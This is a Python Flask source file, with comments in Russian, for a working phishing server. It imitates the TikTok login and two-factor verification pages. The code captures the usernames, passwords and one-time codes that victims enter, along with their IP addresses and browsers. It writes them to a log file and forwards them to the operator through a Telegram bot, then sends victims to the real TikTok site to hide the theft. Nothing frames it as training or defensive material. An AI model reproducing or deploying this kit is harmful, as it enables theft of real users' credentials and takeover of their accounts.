# language: Python 3.10+, file: phish_server.py
# install: pip install flask requests
# run:     python phish_server.py
# open:    http://127.0.0.1:8080

import datetime
import threading
import requests
from flask import Flask, request, jsonify, redirect, render_template_string

# ============================================================
# КОНФИГ — правь тут
# ============================================================
TELEGRAM_BOT_TOKEN = ""       # токен от @BotFather (пусто = без телеги)
TELEGRAM_CHAT_ID   = ""       # твой chat_id от @userinfobot
REAL_TIKTOK        = "https://www.tiktok.com/login"
LOG_FILE           = "creds.log"

app = Flask(__name__)
_lock = threading.Lock()

# ============================================================
# HTML СТРАНИЦЫ ВХОДА (встроен)
# ============================================================
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in | TikTok</title>
  <style>
    body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .box { width: 380px; border: 1px solid #e3e3e4; border-radius: 8px; padding: 32px 28px; box-shadow: 0 2px 8px rgba(0,0,0,.06); }
    h2 { text-align: center; font-size: 30px; margin: 0 0 24px; letter-spacing: -1px; }
    input { width: 100%; box-sizing: border-box; padding: 13px 14px; margin-bottom: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; outline: none; }
    input:focus { border-color: #fe2c55; }
    button { width: 100%; padding: 13px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
    button:hover { background: #e0234a; }
    .hint { font-size: 12px; color: #888; text-align: center; margin-top: 16px; }
    .hint a { color: #161823; text-decoration: none; }
  </style>
</head>
<body>
  <div class="box">
    <h2>TikTok</h2>
    <form id="loginForm">
      <input type="text" name="username" id="username" placeholder="Email or username" required autocomplete="username">
      <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit" id="submitBtn">Log in</button>
    </form>
    <div class="hint"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.getElementById('submitBtn');
      btn.disabled = true; btn.textContent = 'Logging in...';
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      try {
        const resp = await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        const data = await resp.json();
        if (data.next === '2fa') window.location.href = '/verify';
        else window.location.href = data.redirect;
      } catch (ex) {
        btn.disabled = false; btn.textContent = 'Log in';
      }
    });
  </script>
</body>
</html>
"""

# ============================================================
# HTML СТРАНИЦЫ 2FA (встроен)
# ============================================================
VERIFY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify | TikTok</title>
  <style>
    body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .box { width: 380px; border: 1px solid #e3e3e4; border-radius: 8px; padding: 32px 28px; box-shadow: 0 2px 8px rgba(0,0,0,.06); text-align: center; }
    h2 { font-size: 24px; margin: 0 0 10px; }
    p { font-size: 14px; color: #666; margin: 0 0 22px; }
    input { width: 100%; box-sizing: border-box; padding: 14px; text-align: center; font-size: 22px; letter-spacing: 8px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 14px; outline: none; }
    input:focus { border-color: #fe2c55; }
    button { width: 100%; padding: 13px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Verify your account</h2>
    <p>Enter the 6-digit code we sent to your phone.</p>
    <form id="otpForm">
      <input type="text" name="otp" id="otp" maxlength="6" inputmode="numeric" pattern="\\d{6}" placeholder="------" required autofocus>
      <button type="submit" id="submitOtp">Verify</button>
    </form>
  </div>
  <script>
    document.getElementById('otpForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const otp = document.getElementById('otp').value;
      const btn = document.getElementById('submitOtp');
      btn.disabled = true; btn.textContent = 'Verifying...';
      await fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp })
      });
      window.location.href = 'https://www.tiktok.com/login';
    });
  </script>
</body>
</html>
"""

# ============================================================
# УТИЛИТЫ
# ============================================================
def log_line(text: str):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {text}\n"
    with _lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line)
    print(line.strip())


def notify_telegram(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10)
    except Exception as e:
        print(f"[!] Telegram send failed: {e}")


def get_client_info():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?").split(",")[0].strip()
    ua = request.headers.get("User-Agent", "?")
    return ip, ua

# ============================================================
# МАРШРУТЫ
# ============================================================
@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/verify")
def verify_page():
    return render_template_string(VERIFY_HTML)


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    ip, ua = get_client_info()

    msg = (
        f"🔐 <b>TikTok Login</b>\n"
        f"👤 <b>Login:</b> <code>{username}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"🌐 <b>IP:</b> {ip}\n"
        f"🖥 <b>UA:</b> {ua[:120]}"
    )
    log_line(f"LOGIN | user={username!r} pass={password!r} ip={ip} ua={ua!r}")
    notify_telegram(msg)

    return jsonify({"next": "2fa", "redirect": REAL_TIKTOK})


@app.route("/api/otp", methods=["POST"])
def api_otp():
    data = request.get_json(silent=True) or {}
    otp = (data.get("otp") or "").strip()
    ip, _ = get_client_info()

    msg = (
        f"📲 <b>TikTok OTP</b>\n"
        f"🔢 <b>Code:</b> <code>{otp}</code>\n"
        f"🌐 <b>IP:</b> {ip}"
    )
    log_line(f"OTP   | code={otp!r} ip={ip}")
    notify_telegram(msg)

    return jsonify({"ok": True})


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print("[*] Сервер запущен: http://127.0.0.1:8080")
    print(f"[*] Логи пишутся в: {LOG_FILE}")
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        print("[*] Telegram-уведомления: ВКЛ")
    else:
        print("[*] Telegram-уведомления: ВЫКЛ (не задан токен/chat_id)")
    app.run(host="0.0.0.0", port=8080, debug=False)
